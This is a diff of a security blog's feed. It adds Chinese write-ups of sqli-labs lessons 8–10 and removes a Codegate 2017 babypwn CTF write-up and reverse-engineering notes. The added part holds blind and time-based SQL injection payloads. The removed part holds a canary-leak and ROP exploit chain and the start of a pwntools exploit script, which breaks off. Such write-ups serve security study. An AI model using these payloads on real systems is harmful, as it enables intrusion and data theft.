+<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-8/?id=id=-1&apos; or 2=1 %23</div></pre></td></tr></table></figure></p>
+<p>发现字符串消失。因此我们可以利用基于页面的变化来进行盲注。<br>比如以下payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-8/?id=-1&apos; or ( select ascii(substr(database(),1,1))&lt;= 255 )%23</div><div class="line"></div><div class="line"></div><div class="line">http://localhost:20000/sqllab/Less-8/?id=-1&apos; or ( select ascii(substr(database() from 1 for 1))&lt;= 255 )%23</div></pre></td></tr></table></figure></p>
+<p>即可根据二分法得到数据库名称。</p>
+<h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less 9"></a>Less 9</h1><p>该关为GET-Time based - Single Quotes。基于时间的盲注<br>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and sleep(5) %23</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/1.png?raw=true" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and sleep(10) %23</div></pre></td></tr></table></figure>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/2.png?raw=true" alt=""></p>
+<p>可以看到我们的sleep语句被带到了sql数据库中执行。</p>
+<p>接下去可以利用sql中的if语句来进行注入，当条件正确则返回1，若不正确则sleep。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))&lt;255,1,sleep(10) )%23</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/3.png?raw=true" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))&lt;0,1,sleep(10) )%23</div></pre></td></tr></table></figure>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/4.png?raw=true" alt=""></p>
+<p>之后利用脚本即可获取数据库名称。</p>
+<h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less 10"></a>Less 10</h1><p>Less-10 GET-Blind-Time based - double quotes<br>这个跟Less 9一样，只是由单引号变为了双引号。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;255,1,sleep(10) )%23</div></pre></td></tr></table></figure>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/5.png?raw=true" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;0,1,sleep(10) )%23</div></pre></td></tr></table></figure>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/6.png?raw=true" alt=""></p>
+<p>除了sleep，还有benchmark函数来进行时间盲注。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">BENCHMARK(count,expr)</div></pre></td></tr></table></figure>
+<p>BENCHMARK()函数重复countTimes次执行表达式expr</p>
+<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;255,1,benchmark(10000000,md5(&apos;a&apos;)) )%23</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/7.png?raw=true" alt=""></p>
+<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;0,1,benchmark(10000000,md5(&apos;a&apos;)) )%23</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/8.png?raw=true" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
+&lt;p&gt;Less-8 GET-Blind-Boolean Based- Single Quotes&lt;br&gt;Less-9 GET-Time based - Single Quotes&lt;br&gt;Less-10 GET-Blind-Time based - double quotes&lt;br&gt;
+    
+    </summary>
+    
+      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
     
   </entry>
   
@@ -1521,493 +1744,6 @@
       <category term="php" scheme="http://yoursite.com/tags/php/"/>
     
       <category term="代码执行" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>逆向学习笔记（一）</title>
-    <link href="http://yoursite.com/2017/08/14/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
-    <id>http://yoursite.com/2017/08/14/逆向学习笔记（一）/</id>
-    <published>2017-08-14T15:04:31.000Z</published>
-    <updated>2017-08-18T11:51:39.128Z</updated>
-    
-    <content type="html"><![CDATA[<p>跟着《加密与解密》学习。<br><a id="more"></a></p>
-<h1 id="第一章：基础知识"><a href="#第一章：基础知识" class="headerlink" title="第一章：基础知识"></a>第一章：基础知识</h1><h2 id="文本字符"><a href="#文本字符" class="headerlink" title="文本字符"></a>文本字符</h2><ol>
-<li>字节存储顺序与CPU有关。<ul>
-<li>Big-Endian: 高位字节存入低地址，低位字节存入高地址，依次排列。</li>
-<li>Little-Endian： 低位字节存入高地址，高位字节存入高地址，反序排列。</li>
-</ul>
-</li>
-<li>ASCII 与 Unicode字符集<ul>
-<li>ASCII: 127以上的部分不统一。8位。</li>
-<li>Unicode： ASCII字符编码的扩展。在win中用两个字节进行编码，亦称宽字节编码(Widechars)。使用0~65535之间的双字节无符号整数对每个字节编码。所有字符均为16位。</li>
-</ul>
-</li>
-</ol>
-<h2 id="Windows操作系统"><a href="#Windows操作系统" class="headerlink" title="Windows操作系统"></a>Windows操作系统</h2><h3 id="WinAPI简介"><a href="#WinAPI简介" class="headerlink" title="WinAPI简介"></a>WinAPI简介</h3><ol>
-<li>略</li>
-</ol>
-<h3 id="常用Win32API函数"><a href="#常用Win32API函数" class="headerlink" title="常用Win32API函数"></a>常用Win32API函数</h3><ol>
-<li>API函数区分字符集： A表示ANSI，W表示Widechars即Unicode。</li>
-<li>常用的API函数：<ul>
-<li>hmemcpy() : win16 API函数。将内存某块数据拷贝到另一个地方。</li>
-<li>GetWindowText（）：USER32.DLL中。取得一个窗体的标题文字或一个文本控件的内容。<ul>
-<li>GetWindowTextA</li>
-<li>GetWindowTextW</li>
-</ul>
-</li>
-<li>GetDlgItem（）： 获取指定对话框的句柄。</li>
-<li>GetDlgItemText（）: 获取对话框文本。<ul>
-<li>GetDlgItemTextA</li>
-<li>GetDlgItemTextW</li>
-</ul>
-</li>
-<li>GetDlgItemInt（） ： 获取对话框整数值。</li>
-<li>MessageBox（）：USER32.DLL中，创建和显示信息框。<ul>
-<li>MessageBoxA</li>
-<li>MessageBoxW</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>句柄：Windows标识，由应用程序简历或使用的对象所使用的一个唯一的整数值。</li>
-<li>Windows消息机制<ul>
-<li>消息(Message)驱动式系统。</li>
-<li>消息队列：系统消息队列，应用程序消息队列。</li>
-<li>常用的Windows消息函数：<ul>
-<li>SendMessage（）函数</li>
-<li>WM_COMMAND消息</li>
-<li>WM_DESTORY</li>
-<li>WM_GETTEXT</li>
-<li>WM_QUIT</li>
-</ul>
-</li>
-</ul>
-</li>
-</ol>
-<h2 id="保护模式简介"><a href="#保护模式简介" class="headerlink" title="保护模式简介"></a>保护模式简介</h2><ol>
-<li>三种模式： 实模式，保护模式，虚拟86模式。当前系统主要运行在保护模式下。</li>
-<li>虚拟内存</li>
-<li>保护模式的权限级别</li>
-</ol>
-<h2 id="认识PE格式"><a href="#认识PE格式" class="headerlink" title="认识PE格式"></a>认识PE格式</h2><ol>
-<li>文件分成不同的区块：<ul>
-<li>.text : 代码段</li>
-<li>.rdata : 运行期只读数据</li>
-<li>.data : 初始化的数据块</li>
-<li>.idata : 包含其他外来DLL的函数及数据信息，即输入表。</li>
-<li>.rsrc : 包含模块的全部资源</li>
-</ul>
-</li>
-<li>PE相关名词解释：<ul>
-<li>入口点(Entry Point) ： 程序执行时的第一行代码</li>
-<li>文件偏移地址(File Offset) : PE文件在磁盘上时各数据的地址。文件偏移地址从PE文件的第一个字节开始计数，起始值为0</li>
-<li>虚拟地址（Virtual Address， VA）: 程序访问存储器所使用的逻辑地址。又称内存偏移地址(Memory Offset)。可写成“段选择子：偏移量”的形式。</li>
-<li>基地址（ImageBase）：文件执行时被映射到指定内存地址中，这个初始内存地址即为基地址。由PE文件本身设定。</li>
-</ul>
-</li>
-</ol>
-<h1 id="第二章-动态分析技术"><a href="#第二章-动态分析技术" class="headerlink" title="第二章 动态分析技术"></a>第二章 动态分析技术</h1><h2 id="OllDbg"><a href="#OllDbg" class="headerlink" title="OllDbg"></a>OllDbg</h2><ul>
-<li>界面<ul>
-<li>反汇编面板窗口</li>
-<li>信息面板窗口</li>
-<li>数据面板窗口</li>
-<li>寄存器面板窗口</li>
-<li>堆栈面板窗口</li>
-</ul>
-</li>
-<li>配置<ul>
-<li>界面设置</li>
-<li>调试设置</li>
-<li>加载符号文件</li>
-<li>加载右键菜单</li>
-</ul>
-</li>
-<li>加载程序<ul>
-<li>创建进程</li>
-<li>attach进程</li>
-</ul>
-</li>
-<li>基本操作<ul>
-<li>F7 ： 单步步进，遇到CALL 跟进</li>
-<li>F8 ： 单步步入，遇到CALL 路过，不跟进</li>
-<li>Ctrl+ F9 : 直到ret指令时中断</li>
-<li>Alt + F9 : 从系统领空回到应用程序领空</li>
-<li>F9 ： 运行程序</li>
-<li>F2 ： 设置断点</li>
-<li>保存修改后的文件：<ul>
-<li>右键 Copy to executable/Selection</li>
-</ul>
-</li>
-<li>Alt+M ： 显示内存</li>
-</ul>
-</li>
-</ul>
-<h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><h3 id="INT3断点"><a href="#INT3断点" class="headerlink" title="INT3断点"></a>INT3断点</h3><p>int3断点，机器码为CCh。当被调试进程执行INT3指令导致一个异常时，调试器捕捉异常并停下来。好处是可以下无数个，但缺点是改变了源程序指令，容易被检测到。检测方法为：取得检测函数的地址，读取第一个字节是否为cc。</p>
-<h3 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a>硬件断点</h3><p>与DRx调试器相关。DRx调试器一共有八个。</p>
-<ul>
-<li>DR0 ~ DR3 : 调试地址寄存器，保存需要监视的地址。</li>
-<li>DR4 ~ DR5 : 未知</li>
-<li>DR6 : 调试寄存器组状态寄存器</li>
-<li>DR7 : 调试寄存器组控制寄存器</li>
-</ul>
-<p>DR0 ~ DR3来设定地址，DR7设置状态，最多只能设置4个断电。优点速度快，可用于替代CC断点。</p>
-<h3 id="内存断点"><a href="#内存断点" class="headerlink" title="内存断点"></a>内存断点</h3><p>对所设的地址设置为不可访问/不可写属性。当访问/写入时产生异常，ollydbg捕获异常后比较是不是断点地址，若是则中断。缺点：慢。不修改源代码，在遇到代码校验时，并且硬件断点失灵的时候，可以用内存断点来代替。数量为1个。</p>
-<h3 id="内存访问一次性断点"><a href="#内存访问一次性断点" class="headerlink" title="内存访问一次性断点"></a>内存访问一次性断点</h3><p>按Alt+M显示内存后，有许多段。在相应的段上单击右键，选择Set break on access，会对整个内存块设置该类断点。这是一次性断点，当所在段被读取或被执行后中断，中断完成后断点将被删除。</p>
-<h3 id="消息断点"><a href="#消息断点" class="headerlink" title="消息断点"></a>消息断点</h3><h3 id="条件断点"><a href="#条件断点" class="headerlink" title="条件断点"></a>条件断点</h3><h3 id="条件记录断点"><a href="#条件记录断点" class="headerlink" title="条件记录断点"></a>条件记录断点</h3><h1 id="第三章-静态分析技术"><a href="#第三章-静态分析技术" class="headerlink" title="第三章 静态分析技术"></a>第三章 静态分析技术</h1><h2 id="文件类型分析"><a href="#文件类型分析" class="headerlink" title="文件类型分析"></a>文件类型分析</h2><ul>
-<li>PEID工具<ul>
-<li>用处：检测大多数编译语言、病毒和加密的壳</li>
-<li>原理：被加壳的程序处理过的程序在壳里会留下相关加壳软件的信息。</li>
-<li>参考</li>
-</ul>
-</li>
-<li>Fileinfo</li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;跟着《加密与解密》学习。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Bin Security" scheme="http://yoursite.com/categories/Bin-Security/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="re" scheme="http://yoursite.com/tags/re/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>[WAF-Bypass] Mysql 注入绕过姿势</title>
-    <link href="http://yoursite.com/2017/08/14/WAF-Bypass-Mysql-%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"/>
-    <id>http://yoursite.com/2017/08/14/WAF-Bypass-Mysql-注入绕过姿势/</id>
-    <published>2017-08-14T12:09:04.000Z</published>
-    <updated>2017-08-14T12:10:03.066Z</updated>
-    
-    <summary type="html">
-    
-    </summary>
-    
-      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="web" scheme="http://yoursite.com/tags/web/"/>
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-      <category term="WAF-Bypass" scheme="http://yoursite.com/tags/WAF-Bypass/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Codegate 2017 Qual-babypwn-writeup</title>
-    <link href="http://yoursite.com/2017/08/12/Codegate-2017-Qual-babypwn-writeup/"/>
-    <id>http://yoursite.com/2017/08/12/Codegate-2017-Qual-babypwn-writeup/</id>
-    <published>2017-08-12T13:09:15.000Z</published>
-    <updated>2017-08-12T15:33:17.034Z</updated>
-    
-    <content type="html"><![CDATA[<p>Codegate 2017 Qual-babypwn-writeup<br><a id="more"></a></p>
-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h2><p>题目提供了一个32位的程序。参数传递用栈来进行。用gdb载入后看一下保护措施，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Arch:     i386-32-little</div><div class="line">RELRO:    Partial RELRO</div><div class="line">Stack:    Canary found</div><div class="line">NX:       NX enabled</div><div class="line">PIE:      No PIE</div></pre></td></tr></table></figure></p>
-<p>用IDA打开进行分析。文件实现了一个socket服务。其真正的服务函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048A71</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v1; <span class="comment">// [sp+1Ch] [bp-3Ch]@2</span></div><div class="line">  <span class="keyword">char</span> v2; <span class="comment">// [sp+24h] [bp-34h]@1</span></div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+4Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v3 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  <span class="built_in">memset</span>(&amp;v2, <span class="number">0</span>, <span class="number">0x28</span>u);</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">      &#123;</div><div class="line">        sub_80488B1(<span class="string">"\n===============================\n"</span>);</div><div class="line">        sub_80488B1(<span class="string">"1. Echo\n"</span>);</div><div class="line">        sub_80488B1(<span class="string">"2. Reverse Echo\n"</span>);</div><div class="line">        sub_80488B1(<span class="string">"3. Exit\n"</span>);</div><div class="line">        sub_80488B1(<span class="string">"===============================\n"</span>);</div><div class="line">        v1 = sub_804895A();</div><div class="line">        <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        sub_80488B1(<span class="string">"Input Your Message : "</span>);</div><div class="line">        sub_8048907(&amp;v2, <span class="number">0x64</span>u);</div><div class="line">        sub_80488B1(&amp;v2);</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">if</span> ( v1 != <span class="number">2</span> )</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      sub_80488B1(<span class="string">"Input Your Message : "</span>);</div><div class="line">      sub_8048907(&amp;v2, <span class="number">0x64</span>u);</div><div class="line">      sub_80489C8(&amp;v2);</div><div class="line">      sub_80488B1(&amp;v2);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    sub_80488B1(<span class="string">"\n[!] Wrong Input\n"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v3;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>整体上看，实现了三个功能，第一个是读入（sub_8048907）输入的数据并输出来（sub_8048907）。第二个功能是Reverse Echo，好像没啥用。第三个功能是退出。</p>
-<p>在Echo功能的<code>sub_8048907(&amp;v2, 0x64u);</code>中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">ssize_t __cdecl sub_8048907(void *a1, size_t a2)</div><div class="line">&#123;</div><div class="line">  int v2; // ST2C_4@1</div><div class="line">  ssize_t result; // eax@1</div><div class="line">  int v4; // ecx@1</div><div class="line"></div><div class="line">  v2 = *MK_FP(__GS__, 20);</div><div class="line">  result = recv(fd, a1, a2, 0);</div><div class="line">  v4 = *MK_FP(__GS__, 20) ^ v2;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>将读入的字符通过recv()函数拷贝到数组v2中，读入的字符长度可以达到0x64即100个字节。而数组v2所在的位置为 bp-34h ，0x34 = 52。所以很明显这里存在栈溢出。但因为开了Canary保护，因此如果要利用栈溢出，就需要泄露Canary值或者其他技术。</p>
-<p>接下去看输出函数<code>sub_80488B1(&amp;v2);</code>中：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> __<span class="function">cdecl <span class="title">sub_80488B1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v1; <span class="comment">// ST2C_4@1</span></div><div class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// eax@1</span></div><div class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// eax@1</span></div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// ecx@1</span></div><div class="line"></div><div class="line">  v1 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  v2 = <span class="built_in">strlen</span>(a1);</div><div class="line">  result = send(fd, a1, v2, <span class="number">0</span>);</div><div class="line">  v4 = *MK_FP(__GS__, <span class="number">20</span>) ^ v1;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>将数组v2的内容发送出去，发送数据的长度由strlen()指定。</p>
-<h2 id="泄露canary"><a href="#泄露canary" class="headerlink" title="泄露canary"></a>泄露canary</h2><p>接下来我们考虑如何泄露Canary值。Canary值的第一个字节总是<code>\x00</code>，加上是小端序。数组v2在一开始通过<code>memset(&amp;v2, 0, 0x28u);</code>进行初始化。所以结合两者情况，栈的分布约莫下；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;\x00&apos; * 0x28 + ? + ? + ? + `\x00`</div></pre></td></tr></table></figure></p>
-<p>当我们输入的字符个数少于0x28时，比如<code>aaa</code>，则v2中的第四个字符是<code>\x00</code>，则strlen(v2)就为3。如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;a&apos; * 3 + &apos;\x00&apos; * 0x25 + ? + ? + ? + `\x00`</div></pre></td></tr></table></figure></p>
-<p>最后返回输出为字符串“aaa”。</p>
-<p>但若我们输入的字符个数等于0x28时，由于后面的数据是canary值。此时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&apos;a&apos; * 0x28 + ? + ? + ? + `\x00`</div><div class="line">`</div></pre></td></tr></table></figure></p>
-<p>对于数组v2而言，canary的第一个字节<code>\x00</code>成了它的结束标志。在strlen时会把canary值得长度加上，在最后返回输出时将canary的值打印出来。从而完成对canary的泄露。</p>
-<p>泄露出canary后就该考虑如何进行栈溢出利用。程序中提供了system函数。但若要getshell，我们还需要<code>/bin/sh</code>字符串，及其他一些操作。</p>
-<h2 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h2><p>为得到<code>/bin/sh</code>字符串的地址，我们可以去泄露出libc版本。<br>考虑到有send(fd, a1, v2, 0)函数，我们只要让fd为4（默认值），a1为libc库函数的got地址，设置v2为4，第四个为0，就能够将libc库函数的地址打印出来。通过泄露几个libc库函数的地址就能得到libc版本，并利用偏移计算出<code>/bin/sh</code>字符串的地址。</p>
-<p>假如我要泄露setsockopt函数的地址。可以构造payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">payload = &apos;A&apos; * 0x28  </div><div class="line">payload += p32(canary_value)</div><div class="line">payload += &apos;A&apos; * 8 # reach 0x28 + 4 + 8 = 52</div><div class="line">payload += &apos;A&apos; * 4 # reach ret</div><div class="line">payload += p32(send_sym_addr)</div><div class="line">payload += p32(vuln_func_addr)</div><div class="line">payload += p32(4)</div><div class="line">payload += p32(setsockopt_got_addr)</div><div class="line">payload += p32(4)</div><div class="line">payload += p32(0)</div></pre></td></tr></table></figure></p>
-<p>其中注意第二行使用了前面得到的canary值。然后我们加上了12个<code>a</code>，这样才能将返回地址覆盖为send_sym_addr的地址。根据32位程序的栈布局，接下来是send()函数调用完后的返回地址，为进一步利用，这里选择回到有漏洞的服务(8048A71)处。再接下来依次是send函数的四个参数。</p>
-<p>在发送完payload后，我们还需要在程序选项中输入一次<code>3</code>，选择功能<code>3. Exit\n</code>,这样程序才能执行到ret，即被我们覆写了的返回地址。所以需要发送第二段payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">r.recvuntil(&quot;Select menu &gt; &quot;)</div><div class="line">payload = &apos;3&apos;</div><div class="line">r.sendline(payload)</div></pre></td></tr></table></figure></p>
-<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>在成功获得libc版本后，现在已经有了system函数，和<code>/bin/sh</code>字符串，但还不能获得shell。因为程序本身是一个socket服务器，所以它的默认文件描述符不是标准输入输出流0或1，而是4，这也是前面调用send函数时第一个参数为4的原因。我们可以使用dup2函数来复制文件描述符，重定向输入输出流。</p>
-<p>dup2函数的原型如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int dup2(int oldfd,int newfd);</div></pre></td></tr></table></figure></p>
-<p>所以对应的，在getshell之前，我们要把原本的文件描述符重定向到标准输入输出流。对应payload为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">payload = <span class="string">'A'</span> * <span class="number">0x28</span>  </div><div class="line">payload += p32(canary_value)</div><div class="line">payload += <span class="string">'A'</span> * <span class="number">8</span> <span class="comment"># reach 0x28 + 4 + 8 = 52</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">4</span> <span class="comment"># reach ret</span></div><div class="line">payload += p32(dup2_libc_addr)</div><div class="line">payload += p32(pop_pop_ret_addr)</div><div class="line">payload += p32(<span class="number">4</span>)</div><div class="line">payload += p32(<span class="number">0</span>)</div><div class="line">payload += p32(dup2_libc_addr)</div><div class="line">payload += p32(pop_pop_ret_addr)</div><div class="line">payload += p32(<span class="number">4</span>)</div><div class="line">payload += p32(<span class="number">1</span>)</div></pre></td></tr></table></figure></p>
-<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">r = remote(<span class="string">'127.0.0.1'</span>,<span class="string">'8181'</span>)</div><div class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</div><div class="line">elf = ELF(<span class="string">"./babypwn"</span>)</div><div class="line"></div><div class="line">sh_loclibc_addr = next(libc.search(<span 